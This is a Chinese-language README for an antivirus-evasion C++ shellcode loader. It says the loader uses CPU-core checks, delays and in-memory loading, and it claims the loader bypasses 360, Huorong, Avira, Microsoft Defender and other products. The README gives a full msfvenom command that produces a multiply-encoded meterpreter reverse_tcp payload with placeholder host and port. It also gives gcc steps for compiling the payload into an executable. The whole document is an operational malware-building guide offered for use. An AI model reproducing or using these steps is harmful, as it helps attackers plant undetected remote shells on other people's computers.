## c++免杀

此免杀加载器本身未做任何编码，只加了cpu核心数检测、延时、内存加载，直接使用cs和msf默认payload会被检出，所以推荐配合msf多重编码使用，可以达到非常好的免杀效果。

如有需要可以自行加一些编码、异或、加解密操作对shellcode进行处理。

### 1、目前免杀情况
实机测试可过360、火绒

沙箱可过360、火绒、小红伞、微软、江民、瑞星等--2022.8.16

### 2、使用方法

1)使用msf多重编码生成payload，例如

```
msfvenom -p  windows/x64/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -a x64 --platform windows -e x64/zutto_dekiru -i 4 -f raw | msfvenom -a x64 --platform windows -e x64/zutto_dekiru -i 4 -f c -o 123.c
```

2)将shellcode 替换cpp文件中的test变量，执行gcc .\memshellSleepCpu.cpp -o 123.exe -lstdc++生成exe


